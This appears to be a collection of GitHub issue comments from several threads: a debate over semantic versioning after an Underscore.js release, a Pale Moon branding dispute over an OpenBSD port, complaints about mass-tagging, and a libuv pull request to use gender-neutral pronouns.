- SemVer isn't perfect, nor are humans, nor are computers. Bugs will always happen. But SemVer at least makes developers instantly more informed about any specific library update they pull in compared to GutVer.
- For things like singular software libraries that expose a single public API, like Underscore.js, I think SemVer makes perfect sense. 
- For frameworks like Rails, and programming languages like Ruby and Python it makes less sense, as they're typically a massive composition of hundreds of different public APIs. Also these projects pre-date SemVer and have their own established conventions about version numbers.
- And finally for applications like MS Office, and Photoshop, SemVer makes little to no sense, as their version numbers is more of a marketing device than a real version number.

**The long version:**

> The trouble with that as I see it is, semver doesn't allow you to distinguish between
> 1. Large breaking changes that affect everybody significantly
> 2. Breaking changes that affect obscure users significantly
> 3. Breaking changes that affect everybody trivially
> 4. Breaking changes that affect obscure users trivially
> 
> I would argue, based purely on the meaning of ""major"", ""minor"", and ""patch"", that case 1 should bump major, cases 2 and 3 should bump minor, and we can argue about case 4.

Please define what you mean with obscure users. The only thing I can think it might mean is people who rely on private methods from a library, at which point those obscure users are simply on their own. Which makes points 2 and 4 irrelevant.

And also, how do you define if something will effect users significantly or trivially? I would imagine that a lot of the time it would depend a lot more on the user's own code base using the library, than the library itself. Aside from maybe completely changing the way you interact with the library.

This leaves me with two points (1 and 3) to tackle:

> 1. Large breaking changes that affect everybody significantly
> 2. Breaking changes that affect everybody trivially

I would personally consider both cases require a major version bump. However, this is in the case of a library, in the case of Rails, or say MS Office like I previously stated, SemVer doesn't make as much sense.

When it comes to a library, to me SemVer is not about representing the internal conceptual state of the code-base. As a user of a software library, I couldn't care less if it's `doCoolShit()` method was completely rewritten in a much better and cleaner way.

To me the **version number of a library represents the state of the public API to the library.** This gives me a quick overview of the intention behind any update based on the version number:
- Changes to the `major` version means the public API has changed and code using the old API will probably not work correctly anymore.
- Changes to the `minor` version means the public API has been expanded in one or more of the following ways:
  - Additional methods added.
  - Existing methods were given extra arguments at the end of their argument list.
  - Callbacks might be given additional arguments.
  - Methods return values might contain more detailed information (if return value is an array/hash).
- Changes to the `patch` version means the public API has not been changed at all, but the underlaying code has some sort of change, like a bug fix, performance improvement, internal code cleanup/restructuring.

And to tackle your last points:

> It's also unrealistic about the maintainer's responsibility. Probably any change could conceivably break some code, somewhere, if you think hard enough. Packages like underscore-semver are partly a joke, but they're partly an honest reflection from a software developer who works for free that he's not going to realistically invest the time to test every change against an unknown and variable downstream ecosystem.
> 
> Finally, no version scheme can really protect you against breaking changes. Even if you had the QA team to plausibly say you are confident that 1.0.1 didn't break anything (which pretty much no project that uses semver actually does), being confident and being right are two different things. You will still release a .patch release that breaks things now and again, and so downstream needs some plan other than ""look at the version number"" to ensure that upgrades don't break behavior.

I think this is what your issue boils down to, you want a versioning system that solves all issues, and because it doesn't let's just go with version numbers that ""feel"" right. What feels right to one developer is often **completely** different than what feels right to another.

Bugs will always happen, as long as humans write software at least. But we can at least try to stick to some sort of convention. SemVer allows me to at a glance infer the intention of any specific update to a library based on which of the three numbers changed. Of course that doesn't mean bugs will not be introduced, but it gives me valuable information right up front without having to spend time digging through a changelog to see what the update is supposed to do.

At the end of the day SemVer isn't perfect, but at least it's understandable. While GutVer (as I'll call it when versions are bumped based on how the dev feels about the changes) means wildly different things for different people.

A somewhat decent example I guess is [Adium](https://adium.im/), when it was rebooted for v2.0, it ended up being Adium v2.0 v0.1, so v0.1 of ""Adium v2.0"". Like how do you make sense of that? Admittedly as the old v0.x and v1.x fell into obscurity they removed the 2.0 from branding around v0.9 if I recall, but it still stores it's user data in a ""Adium 2.0"" folder for example.
"
3284	"“GutVer” is a great term, @jimeh. No author should be making a value judgement of obscurity or triviality, especially for a popular library. Get it documented, and communicate your intent.
"
3285	"@jimeh 

Your argument, and other comments here,  characterize me as holding SemVer to some standard of perfect, finding it wanting, and saying it's bad.  That's not true.

My argument is that it offers zero or near-zero value.  It is not a case of it not being perfect; it is a case of it not being even good.

The ""value"" that SemVer purports to provide is that a non-human package manager can make decisions about whether to upgrade the package.  But if mistakes can be made--an author can accidentally twiddle the public API in a minor version--then no sysadmin should every rely on this to be right in production.  To delegate production updates to a system that can fail is, quite frankly, irresponsible administration for production.  The sysadmin must, in 100% of cases, verify the update manually, since the author can be wrong, and the mistake isn't going to cost _the package author_, it's going to cost _you_.  And now what has SemVer done for you?

What instead GutVer does (or FerVer is, I think, a sensible alternative really) is it says well, breaks are a fact of life.  Let's communicate something **to a human** about how severe we think the break is.  Is it big, is it small?  And now the _human_ sysadmin tasked with updating the package makes a call.  They may even plan a release schedule and allocate upgrade time based purely on the version number.  I would allocate different time for updating Python 2->3 than Python 2.6->2.7 for example.  That is something that cannot be done with SemVer at all, because all API changes are considered the same severity level.

Sure it's not objectively machine-readible but SemVer is only machine-readible if you are an irresponsible sysadmin who delegates updates to a faulty machine, which is not a case worth considering.  In all other cases, SemVer provides zero or near-zero value, and GutVer/FerVer offers the clear value of being able to estimate the time required to make breaking updates.

Finally, your dismissal of all the projects that don't use SemVer for some reason (even more than I listed, you've added MS Office and Adium to the mix) I think just provide additional ammo that SemVer doesn't solve the problems of many real software projects.  Apparently SemVer isn't appropriate for ""frameworks"" or ""programming languages"" or things where there is a ""marketing issue"" or Adium for some unspecified reason, which are vague enough holes that I can drive a truckload of my own programming projects through them and avoid using SemVer for them.

The thing is, is that it is easy to make claims that X is good in some theoretical way, as we are doing here.  And it is easy to attract some early adopters that share your belief that X is good.  But when major software projects, fully aware of X, decide not to adopt it, now we have empirical evidence that X has serious practical problems.  From what I can see, the response is to declare them out of scope in some way (""silly framework, semver is for non-frameworks"") rather than find out what their problems are and try to fix the standard so it will work for them.  

On that basis, you might as well just declare me out of scope along with them.
"
3286	"@drewcrawford Updating production code wasn't the use case that started this issue - everyone acknowledges that you shouldn't update production code without testing. I don't know why people keep bringing this up, not a single person has said that this broke production code because they just blindly updated.

I started a new project and installed 10 dependencies, 2 of them were broken because of this. The only way to fix this is to manually create a lock file to pin the dependencie's dependencies down (after spending hours working out what was wrong).

I completely agree with the criticism of semver and I would even be ok with putting out really minor ""breaking changes"" on a minor release (where we are talking about breaking just a couple of dependent modules) but this release contained substantial breaking changes that broke hundreds of dependent modules and initially many of the changes were not even documented or included in the changelog. It cannot be the state of affairs that a minor release of underscore renders hundreds of packages uninstallable. And I don't accept that the solution is for all these dependent modules to pin the version down and therefore have to keep releasing updates containing just a version bump.
"
3287	"While it didn't break production code for me. It wasted a good hour of my time before I realized what was going on and had to go research the changes in underscore templates. I honestly thought I was going nuts until I saw the changes in 1.7.0.
"
3288	"@danielchatfield I actually agree with you.  A release that breaks a lot of downstream modules should be considered ""major"".
"
3289	"Why are people not discussing http://sentimentalversioning.org/ here?

> Jeremy calls his versioning system romantic (which is very sentimental of him) It looks like semver (major.minor.patch), but with a personal meaning.

@jashkenas thanks for rolling it back, but #senver FTW!
"
3290	"I think we can combine all the requirements discussed in this thread, and all of semantic and romantic versioning with a superset of both numbering schemes that uses 4 versions and reads like _""A.B.C.D""_.
- **A:** a major breaking change like a rewrite or complete overhaul of the API
- **B:** a minor breaking change that doesn't justify a completely new A, but clearly signals the breakage it introduces
- **C:** a non-breaking extension of the API
- **D:** a bug fix that doesn't change the API at all

If following that paradigm, Underscore would have gone from version 1.6.0.0 to 1.7.0.0 now, and everybody would be happy. @jashkenas (who makes good points) could keep his meaningful human-readable version numbers for all of us to enjoy. And NPM (which has good points for needing SemVer to do its job) could handle the breaking change appropriately, for all of us to enjoy as well. 

3 numbers will never be enough to express 4 different things, no matter how one looks at it.
"
3291	"@kevgo The only problem being, the number of different things are way more than 4. 

And @jashkenas  hinted at needing **lesser** manually specified parameters which have to be cognitively handled by a developer, not **more**
"
3292	"I would be happy to get behind a 4-component `major.minor.nonbreak.bugfix` standard.  In fact I proposed such a change with semver in [this thread](https://github.com/mojombo/semver/issues/213).

Unfortunately for semver, calling ""minor"" a breaking change is too radical a thing for them, even though lots of software does it (Python, Rails, Django, just to name a few).

So I would sign on to such a standard, but we won't be calling it semver.
"
3293	"@drewcrawford I think it's a case of the tradeoff between human-readable and easily understood, vs more information for the machine to infer from. The current 3-component format seems a good balance in general, for you would be too worried deciding on the _right_ new version number for your packages otherwise.

The _right_ solution would still be something involving more automation, than manual entry.
It just needs to be built, and I think this discussion (and @jashkenas's well thought out reply) might just lead to one.
"
3294	"@asyncanup I disagree strongly that 4-component schemes introduce analysis paralysis.  For authors that agree with semver that all API changes are major, they could simply interpolate a "".0."" into their existing numbers and carry on as usual.  There is nothing to agonize about.

I'm not opposed to solutions that rely on automation to solve this problem, but as usual the devil is in the details, and it's difficult to make any intelligent comment in the abstract.
"
3295	"I think I'm on board with semver now, with versions regularly going over 10. It seems fine to me that Chrome will turn 40 by the end of the year. It will take some getting used to it but it's worth it IMHO.
"
3296	"@drewcrawford What I propose would not replace or ""change"" existing SemVer, but extend it by adding a larger version in front (maybe call it the ""generation""). The lower 3 versions (B, C, D) would map to the same semantics as defined by SemVer. 
"
3297	"@jdalton You're my hero
"
3298	"just use lodash :)
"
3299	"when is the version 1.7.11 solving the problems of 1.7.0 expected to be released?
"
3300	"@harrysingh The bump is being discussed over on #1855.
"
3301	"This is the most useless thread I've read, ever.
Intentionally ignoring semver at this point in time is just a very bad thing.
"
3302	"(ノಠ益ಠ)ノ彡┻━┻
"
3303	"if i saw a 0.x.0 update i sure as hell would be reading changelogs...

https://www.npmjs.com/package/npm-check"
3304	Underscore and Backbone are so dead now...lol
3305	Dead or alive they deserve respect.
3306	@ibara 
3307	"I will do no such thing until I speak with the person who owns the rights to the intellectual property, which appears to be not you.

Additionally, your confrontational attitude dismisses you from any and all future discussions on the matter. I will only speak to M.C. Straver about this issue, and I wish to do so amicably. Your attitude demonstrates that you are unfit to be an intermediary of any sort."
3308	"Alright.

@wolfbeast Tag, you're it!

"
3309	I have sent him an email.
3310	"@ibara You could have just complied. I don't see the problem. You know, except for this being a direct violation of the terms for redistribution with official branding as you are materially changing the end result of the intended software beyond what is absolutely necessary for the application's operation on BSD.

I became aware of this because a user pointed out they were using Pale Moon on BSD. A Build I was unaware of so I came to check out what exactly was going on with it since you had used Official Branding."
3311	"This repository does not create nor distribute binaries. This repository is not official in any way.
Again, you are dismissed from this conversation since you have no legal authority over the matter."
3312	"> This repository does not create nor distribute binaries.

Point 8b, my friend. Also, Moonchild will respond in his own time but I suggest you stop being rude to me.. All I did was point out issues with your imposed build configuration and gave you options under the Redistribution License for which I know very well and have had to obey for my own build once upon a time."
3313	I suggest you leave then.
3314	"@ibara **Please comply with the requests made in this issue, or re-brand the browser.**

1. You are redistributing the browser to others
2. You are using Official Branding
3. You are not following the requirements set out to use official branding

If your repository is **in any way redistributing the browser** in source or binary form **with official branding**, you **must** understand the fact you have no rights to such branding unless specifically given (see also the statements to that effect everywhere in the source).
The redist license's stipulations apply in that it provides an exception to the need for permission in specific situations (see point 8, specifically).
You have not been given special permission to deviate from 8b; as such you must stick to normal practices for GNU porting of software and not reconfigure the build- or run-time of the application beyond what is required ""to make it run"" (and that does not include externalizing libs because such has a direct and severe impact on the resulting application's operation). As an author of a ports system you _should_ be familiar with this general rule, explicitly stated once again in our redist license.

Your insistence to only speak to me in person about such matters is ridiculous, considering the license is up on the website, worded clearly for everyone to see, and you're clearly not adhering to it. But, here I am, as requested.

Now, follow the license terms, _please_.

I will not be as educational next time."
3315	"> I will not be as educational next time.

What next, lawyers ? mafia ? Wow, that escalated quickly. Cool down please..

@mattatobin : starting your issue by `you will` was clearly not the nicest way to put things. Maybe `Please` would have helped...

Anyway, i'd suggest removing the port. We already have enough mozillas in the portstree, and given how this started, i doubt it'd end up being imported in the official portstree."
3316	"> What next, lawyers ? 

You think trademark law is a joke?"
3317	"Absolutely not. I'm just saying escalating to ""i'm going to send you my lawyers"" over an issue which was opened 3 hours ago is completely out of proportion."
3318	"I said no such thing. You implied it.
I stated I'm not going to explain this any further. You should know these things if you write a ports system. I should not have to re-iterate it."
3319	"> I said no such thing. You implied it

Oh, sorry then.

> I will not be as educational next time.

Then enlighten me, what was this implying ? :)

Anyway, i'll let @ibara do what he thinks is the best way to solve this issue. My position would be to remove the port to avoid any kind of issue, but if he prefers disabling the branding (and i don't know if a non-official default branding is shipped in the source as mozilla does, because otherwise that means creating your own branding which is much more work) that's his call."
3320	"> Then enlighten me, what was this implying ? :)

It was implying that you _can_ expect me to be as demanding as @mattatobin and expect at the very least an official cease&desist if persisted.
By the way, the escalation was fast because of what @ibara did, in refusing to talk to anyone but the IP owner. You're playing it high if you do that, expect responses in kind. I do not take very kindly to be dragged into this kind of thing first thing on a Monday morning, either. :coffee: 

As for branding, the default branding (when not using `--enable-official-branding`) is the New Moon branding included in the tree which has no limitations (see redist point 13 in the current version)."
3321	"Of course, they could just stop using system libs.. And upon inspection of the patches I find them to be necessary for proper operation on BSD.. My only remaining concern is the CFLAGS being used in `--enable-optimise`.

Then it wouldn't be a problem to use official branding."
3322	This issue is now officially resolved. There will be no Pale Moon browser, official or not. The port has been removed. Farewell, petulant children.
3323	Sigh.
3324	"For the record, apparently the e-mail reply I sent was never delivered, because the `devio.us` mail server choked on having a TLS encrypted connection established with it. (fix it?)

For completeness, here's the important bit of that e-mail response that apparently never got across:

>The issue you don't seem to understand here is that our in-tree
libraries are often patched specifically for the quirks of our code, and
of very specific versions (system-installed versions may or may not
work, since APIs and behavior changes). Also, due to the sheer size of
our code, number of components involved and interconnectivity between
such components, any component that does not play well due to a version
difference or missing a patch will have immediate and far-reaching
impact on the rest of the resulting application.

>..., there are too many unknown factors in the resulting binaries on
user's systems. What you are asking is exchanging known-good
combinations of libraries with unknown and potentially disastrous
combinations as-present on end-user's systems.
"
3325	Too bad that that that had to end like that. That outcome was less than productive, as escalation leads always to a non-success.... Something everyone of us should keep in mind more clearly.
3326	"> The issue you don't seem to understand here is that our in-tree
> libraries are often patched specifically for the quirks of our code, and
> of very specific versions (system-installed versions may or may not
> work, since APIs and behavior changes). Also, due to the sheer size of
> our code, number of components involved and interconnectivity between
> such components, any component that does not play well due to a version
> difference or missing a patch will have immediate and far-reaching
> impact on the rest of the resulting application.

It makes sense to mention this somewhere obvious for the packagers?
So you can avoid to piss of projects.
My 2 cents"
3327	"The why isn't the issue here only the what and the what is the redistribution license to use official trademarked branding.

If people actually read the licenses, obeyed them, and not escalated the issue beyond all reason because of a couple of phrasing choices. Then perhaps this could have been resolved to everyone's satisfaction.

However, this didn't work out. Hopefully, in the future everyone can learn from this incident. I am sure there are BSD users who would like to have their choice in web browsers and if that choice were to be Pale Moon.. Then we should make sure they get Pale Moon and not something.. other.

Though a maintainer who can keep their composer and not fly off the handle at the slightest perceived provocation would be nice too.

Stable build, stable maintainer.. A winning combination! Maybe next time."
3328	"On 2018-02-06 8:35 AM, New Tobin Paradigm wrote:
>
> The why isn't the issue here only the what and the what is the 
> redistribution license to use official trademarked branding.
>
> If people actually read the licenses, obeyed them, and not escalated 
> the issue beyond all beyond all reason because of a couple of phrasing 
> choices. Then perhaps this could have been resolved to everyone's 
> satisfaction.
>
The phrasing choices really set people off. So maybe you could consider 
rewording your template. How about:

We notice that your port of %s at %s doesn't conform to the licensing 
policy for our software.
We hereby request that you bleah bleah bleah

Your opening volley would then sound a lot more like a normal license 
conformance request and a lot less like something from You Know Who.
"
3329	"This is all totally ridiculous because the basic premise ""You are redistributing the browser to others"" is incorrect."
3330	"""The why isn't the issue here only the what""

This why is the cause for this what. 

If you go this superexotic way of brandings in the open source community, you might be so kind to actually tell that. Packagers have much to do, to make their life even harder by stating ""read all licences from top to the ground and consult some lawyers to be sure"" is unpractical. "
3331	"Actually, reading the first email carefully says that: you should use the
bundled projects, not reuse the system installed projects. I don't
understand what branding would be affected by using internal libraries. If
you carefully explain this point, and do this politely, maybe people would
listen.

ac_add_options --with-system-jpeg=""${LOCALBASE}""
ac_add_options --with-system-zlib
ac_add_options --with-system-bz2=""${LOCALBASE}""
ac_add_options --with-system-libevent
ac_add_options --with-system-icu
ac_add_options --with-system-webp=""${LOCALBASE}""
ac_add_options --with-system-sqlite=""${LOCALBASE}""
ac_add_options --with-system-ffi=""${LOCALBASE}""
ac_add_options --with-system-pixman
ac_add_options --with-system-libvpx
ac_add_options --with-system-nss
ac_add_options --with-system-nspr


On Tue, Feb 6, 2018 at 10:09 AM, MatthiasSchuster <notifications@github.com>
wrote:

> ""The why isn't the issue here only the what""
>
> This why is the cause for this what.
>
> If you go this superexotic way of brandings in the open source community,
> you might be so kind to actually tell that. Packagers have much to do, to
> make their life even harder by stating ""read all licences from top to the
> ground and consult some lawyers to be sure"" is unpractical.
>
> —
> You are receiving this because you are subscribed to this thread.
> Reply to this email directly, view it on GitHub
> <https://github.com/jasperla/openbsd-wip/issues/86#issuecomment-363472307>,
> or mute the thread
> <https://github.com/notifications/unsubscribe-auth/AA9V0K96vmp1-MvTILAQSoMozzuFUFTCks5tSHlGgaJpZM4R48vm>
> .
>
"
3332	"As I understand it, Pale Moon does not want to be blamed and/or responsible for issues stemming from regressions in versions of libraries other than the ones they officially test with, correct? At the same time, OpenBSD does not want to be blamed and/or responsible for regressions in versions of packages which do not come with their system and, as such, were not tested anywhere near as well.

Sorry for barging in, but honestly, I think in this case both sides walking off and agreeing to disagree might be the best option, if so. (That, or I suppose Pale Moon could distribute an official build of their browser aside from the official OpenBSD ports tree - but I'm not sure if there's enough user demand to justify that?)"
3333	"@mattatobin @wolfbeast 

This is ridiculous. You were apparently [approached 2 days ago](https://forum.palemoon.org/viewtopic.php?t=18256). This repository is a work in progress staging area, nothing is built or distributed to users from here - heck, you attacked the person doing the actual legwork of getting your stuff to build on OpenBSD.

Regarding patches on the port and enabling branding - damn read that forum topic 'OpenBSD & Pale Moon: coordinating patches and officially branded package?'. They were likely to be upstream.

We rarely allow software to use bundled libraries - the equivalents in our system have patches that actually make them build and work on OpenBSD - I would guess that your bundled ones do not - hence would require the same work we put on the dependencies applied as custom patches just to build your project...

You flipped out with your cease & decease against a work in progress port of a person who was actually trying to cooperate with you.

I'm sure as hell I will personally stick the hell away from Pale Moon."
3334	your browser, your way
3335	"@mulander 

> ""I'm sure as hell I will personally stick the hell away from Pale Moon.""

I already read the same in some communities. 

This reminds me of the Debian - Firefox (Iceweasel) case. 
While this one escalated probably quicker. 

Once an attack is more important as cooperation, is there something ill."
3336	"The Mozilla Public License is several orders of magnitude from the Near-Public-Domain licenses than you guys may be used to.

The MPL clearly states:

> This License does not grant any rights in the trademarks, service marks, or logos of any Contributor

This is where the Redistribution License comes in where Point 5 deals with unmodified and unaltered redistribution. Point 8 is a special exception to that which was created specifically for free and open source operating system packagers. If those are not satisfied then it falls to point 5 which is unmodified and unaltered and if THAT is not satisfied it goes to point 10 which is basically ""Ask for special permission"". Failing THAT it falls back to the MPL which does not grant any rights in the trademarks, service marks, or logos.

Because we do alter our in-tree libs with specific fixes with our glue in mind as well as add additional features and capabilities they are as much parts of the total sum of what makes up Pale Moon as the layout engine or javascript engine.

Most notably, nspr/nss as well as libpng, and who knows what happens with libicu.

So, since this has been a problem elsewhere and over the past few years.. I am considering ripping out the ability to use systemlibs period. What is your BSD policy of generally not allowing bundled libs in that case?"
3337	Today is my last day using Palemoon.  Rewarding offensive bullies running restrictively licensed projects is not high on my list of things to do.
3338	"Tone deaf upstream. I never ever used Palemoon, but I sure won't ever use it.

@ibara was just trying to port Palemoon, and as @mulander pointed out we don't allow bundled libs in OpenBSD..."
3339	"@mattatobin do you really think coming here and berating volunteers who put their spare time and effort into porting Pale Moon code to OpenBSD is a good idea? While you are certainly entitled to claims through your license and the other scrolls you reference, please get down from your high horse and realise your behaviour is actively turning people away from Pale Moon. Well done.

Folks, move along, nothing to see here."
3340	"Mass-notifying is an unusual and almost spammy practice. Deleting comments that question it, though, is really bad.

It's great that someone takes over the responsibility of maintaining a useful service, and thanks for doing it @PyroSamurai. But this might not be the best way to ask for support :wink:"
3341	"Hmm, very bad. But I will support the upcoming maintainer. Thanks in advance!

But this method is not really great..."
3342	Going to comment again, since you deleted my last one, but this is 100% not cool. I will not be starring this repository on principle after this. Mass tagging is an annoying practice in any scenario, but particularly bothersome in Github issues. I wish you luck in maintaining JDM, but I can't say I plan on actively supporting this. 
3343	"It was the most efficient way. I appreciate the support. Please minimize posts though, because I do understand that many do not wish to receive extra notifications even though there is a unsubscribe button.
"
3344	Promoting account deletion by subscribing  hundreds of people  to something that we didn't sign up for.. :(
3345	"You've *already caused* them extra notifications, friendo. After your dozen-or-so pings woke myself and my partner up (it's five-past-four in the morning here in Chicago), I don't think any of *us* are going to be the ones blamed for the noise.

(For anybody not previously aware — there's an “unsubscribe” button on the right-hand side of this page; I strongly suggest you use it.)

(I, too, am commenting for the — uh, third, time? Christ, kid.)"
3346	"Thank you for contributing this pull request! Here are a few pointers to make sure your submission will be considered for inclusion.

Commit alex/libuv@1ff9d18d398fb9f35b72fa0174048e1f36ec5020 has the following error(s):
- Commit message must indicate the subsystem this commit changes

The following commiters were not found in the CLA:
- Alex Gaynor

You can fix all these things _without_ opening another issue.

Please see [CONTRIBUTING.md](https://github.com/joyent/node/blob/master/CONTRIBUTING.md) for more information
"
3347	"They/them can absolutely be used as an ungendered singular. Further, even if they couldn't, that concern would be trumped by the fact that using gendered language is hostile.
"
3348	"Rule 1 of writing: Throw your Strunk & White into the ocean immediately.
"
3349	"I've now submitted a CLA, but I'm not sure what I'm supposed to put in the subsystem part of the commit. Can anyone make a suggestion?
"
3350	"Sorry, not interested in trivial changes like that.
"
3351	"+1 for merging this change.
"
3352	"I'm sorry to hear that. I don't really see why you wouldn't merge it if it's so trivial though. Surely making the library less hostile is worth a few seconds of our time to press the ""merge"" button?
"
3353	"Glad this didn't go through. The White Knights of tech are getting a bit over their heads on this. One thing is to raise awareness of a problem that exists throughout society -- not just tech, a whole different one is to go to the extent of requesting a pull request to remove gendered references. That helps no one. Zero. It does not advance anyone's argument. 
"
3354	"+1 ""him"" definitely needs to be replaced with ""them""
"
3355	"@rdodev I would like to raise awareness of another problem: dismissing attempts to actually change things as ""white knighting"", with the subtext that there's no genuine platonic reason women deserve to be defended.

Awareness is of little value if no one ever acts differently, and open source is supposed to be about fixing what's broken, right?  Patches welcome and all that.  Well, here's your patch.
"
3356	"@eevee ""with the subtext that there's no genuine platonic reason women deserve to be defended.""

Are you implying that women cannot defend themselves and need people to defend them? I think that stance is even more sexist that a ""him"" vs. ""them""
"
3357	"@rdodev so you need a woman to submit this pull request to consider it?
"
3358	"@rdodev Are you implying that only women should care about how women are regarded?  Isn't that how we got here in the first place?

When the very problem is that there are very few women participating in open source, what do you expect to accomplish by shaming men who try to make the environment more welcoming for women?  That in itself is even more offputting.
"
3359	"So you're saying this pull request would have been accepted if it had been submitted by a woman rather than by Alex? Shall we see if we can put that theory to the test?
"
3360	">  The White Knights of tech

What white knights? I don't see anyone typecasting women as damsels in distress.

> It does not advance anyone's argument.

What argument? It's a small editorial change to reflect that sometimes women want to use libraries too.

> Are you implying that women cannot defend themselves and need people to defend them?

That's a total load of bullshit. We should _all_ strive to create the world we want to live in, whether it effects us directly or not. We're all in this together.

I don't even know why I'm replying to this. You do all know that Ben's moved on ages ago, right?
"
3361	"No, there's no need for this pull request be it requested from a man or woman. That's the whole issue I have. This PR will not advance women in tech, it will not increase the awareness, it will not get more women in tech or STEM majors. Such a trivial and minor change is about-face and grandstanding. You really want to make a change? Go volunteer at your local high school and get girls excited about tech or other STEM fields. Support groups like PyLadies or Women Who Code, CodeChix who are trying to bring in and support women into the field. But this PR? This PR is political: to be able to say ""I stand for women's right in tech"" because you changed a gendered pronoun without actual consequence.
"
3362	"@rdodev Make the change yourself and strip his name from the commit log, then. Being worried about someone's personal motivations in suggesting a good thing isn't a reason to not do the good thing.
"
3363	"This PR and supporting PyLadies/WWC/CodeChix/etc are not mutually exclusive; suggesting so is absurd.
"
3364	"Given that the work had already been done, why click Reject, rather than Accept?

Yes, the change is trivial, but that's a reason for accepting it, not rejecting it.

Why do you consider it more appropriate to challenge how Alex chooses to spend his time rather than challenge the deliberate choice to continue using gendered language when a gender neutral alternative has been offered for inclusion?
"
3365	"Clicking the 'Merge pull request' button would have taken less effort than it did to click 'Close' and leave a comment, but the positive effect from accepting it had would have been much greater.
"
3366	"Hello, I might be a woman. 100% for Singular They. It is perfectly grammatical (""you"" works the exact same way) and never socially problematic. I don't see what the problem is and I don't see why @alex and @eevee being proactive is some sort of motivation problem. I would recommend @rdodev consider that change begins with the small things. 
"
3367	"I mean, we can't _all_ not be tools.
"
3368	"While this little change is highly unlikely to have a large impact, it might have a small one–someone might see it and think ""oh, someone is considerate of non-males in this male-dominated industry, that's great!"" On the other hand, rejecting a simple change that someone wrote for you gives a mild signal that there are quite a few people who still don't care. And those who oppose equality will feel vindicated and supported.

None of these are a big thing. But when choosing between a minor positive signal and a minor negative signal, you chose the negative one for no reason at all. There was no work involved, there was no loss in quality of your code, and it would have been a small good deed. :-)
"
3369	"> This PR will not advance women in tech, it will not increase the awareness, it will not get more women in tech or STEM majors.

Speaking as a woman, I frequently see documentation that uses exclusively male pronouns and and know that it's often because doc authors forget/don't consider that they have female readers too. The implication (intended or not) is that the audience of software developers is male. I mentally compare that to how I'm always assumed to be male first on the internet. I'm +1 on this documentation change.
"
3370	"Remember that the whole world is watching this discussion, and consider--carefully--the message you are sending, not just with the PR itself, but with the way it is being handled.
"
3371	"I've read enough documentation with ""he"" in it that I'm almost desensitized to it. It's never affected me. It's an honest mistake made by people who haven't really thought about it (and the problem exists outside of technology).

The concerning part here is that when it does affect someone, you're _actively_ fighting against it. It doesn't hurt a single thing to merge this patch, but the damage you do in not merging the patch and defending why you're not merging the patch seems to be digging a hole for yourselves that you weren't initially in. :(
"
3372	"+1 to merge. 

Even if the phrase ""hostile"" seems a little strong to me, it would be unreasonable for me to dismiss people who claim they perceive gendered pronouns as such. The requester is hardly asking for accommodation that requires a Herculean effort—in fact, closing this issue with a rebuttal certainly took much more effort than merely merging it in!

I'm personally disappointed that the Node and Angular maintainers seem to continually go out of their way to come across as inconsiderate jerks. 
"
3373	"Stop pissing around and merge the damn PR. This is not political correctness gone mad, just an overblown conversation into something that never needed a conversation.

Using gender specific text where it is not applicable is just bad writing style. Nobody here is white knighting, you just wrote it wrong. Sort it out.
"
3374	"I don't see the harm in merging...
"
3375	"@sam-github @alex if you want an explicitly singular pronoun, how about [""one""](http://en.wikipedia.org/wiki/One_%28pronoun%29)?
"
3376	":+1: :shipit: 
"
3377	"+1 to the merge for another tiny step towards gender inclusivity in tech. 
"
3378	"> You really want to make a change? Go volunteer at your local high school and get girls excited about tech or other STEM fields. Support groups like PyLadies or Women Who Code, CodeChix who are trying to bring in and support women into the field.

Its funny that you ask this, so those women can later come across this documentation and find it male oriented.

> But this PR? This PR is political: to be able to say ""I stand for women's right in tech"" because you changed a gendered pronoun without actual consequence.

The power to change that is yours. All you have to do is realize it would make things better in a small way, just change it and move on, like the small thing it will be after it's changed.
"
3379	":+1: to merging.
"
3380	"+1 merge it
"
3381	"Just merge it(TM).
"
3382	":+1: merge it.
"
3383	"Enough laughs for today...
"
3384	"Landed on 47d98b64c45db8335bf7e065351e385cae32323d.
"
3385	"""The structure of a language affects the ways in which its respective speakers conceptualize their world, i.e. their world view, or otherwise influences their cognitive processes.""

http://en.wikipedia.org/wiki/Linguistic_relativity

This is a thoroughly researched principle, across many disciplines, and for nearly a century.

Read the diff. Its total effect is to remove a ""he"" and a ""him"".  Merge it.
"
3386	"I completely appreciate the view of everyone who is disinterested in this pull request. As far as I can tell, libuv doesn't have anything to do with gender, so this is irrelevant to the project. Might I recommend, therefore, that the best way to avoid wasting time on gender discussions is to avoid writing about gender in your code (which this PR accomplishes)?
"
3387	"Thanks Isaac.

On Fri, Nov 29, 2013 at 6:26 PM, Isaac Z. Schlueter <
notifications@github.com> wrote:

> Landed on 47d98b6https://github.com/joyent/libuv/commit/47d98b64c45db8335bf7e065351e385cae32323d
> .
> 
> —
> Reply to this email directly or view it on GitHubhttps://github.com/joyent/libuv/pull/1015#issuecomment-29542508
> .

## 

""I disapprove of what you say, but I will defend to the death your right to
say it."" -- Evelyn Beatrice Hall (summarizing Voltaire)
""The people's good is the highest law."" -- Cicero
GPG Key fingerprint: 125F 5C67 DFE9 4084
"
3388	"""They"" is ""singular gender-neutral"" in english, has been for centuries.

Libuv is intended to be used on all major operating systems, and by all genders.
"
3389	"guys the patch was accepted by isaac everything is cool (except this thread ofc :6)
"
3390	"Thank you isaacs for committing the PR 47d98b6
"
3391	"Thanks, Isaac.
"
3392	"Thank you, @isaacs!
"
3393	"For those wondering, the singular they has a long and distinguished history: http://en.wikipedia.org/wiki/Singular_they

Both changing this and refusing to change it are political choices. There is no non-political option. I'm sure the original writers meant no harm; his should bet taken—like any pull request—as an offer of a step forward, not an accusation.
"
3394	"Job done. You can holler down now.
"
3395	"yay, @isaacs! 
"
3396	"yay. thanks for this @isaacs
"
3397	"Wow.
"
3398	"Looks like I'm late to this discussion, but if anyone is still reading this and aren't convinced of the necessity of this change, see: http://alyx.io/educational-resources/gender.html#generic-masculine-pronouns
"
3399	"Glad to see this landed.

@rdodev, everyone else here might not be helping as much as you like, but you are **actively hurting** the chances of encouraging more women in tech with comments like yours. Is that what you want?
"
3400	"Imagine this story for a second:

1) Decide you're totally gonna hack with libuv, start reading source
2) You notice a misspelling, an obvious typo, a missing word, etc
3) You think, ""oh hey I'll fix this and send a PR and help out! I like proofreading!""
4) People accuse you of being a pedantic ""grammar nazi,"" wasting everybody's time, etc., etc and don't merge it even though it's objectively better copy.

Wouldn't that be weird?
"
3401	"@github Can we **please** have https://github.com/isaacs/github/issues/38?
"
3402	"@ThiefMaster I do all those things, and though I appreciate your mindset of ""do something that actually matters"" I believe this is something that matters. 

It's also worth noting there were barely any women in this thread. Just a bunch of guys that want things to be better. 

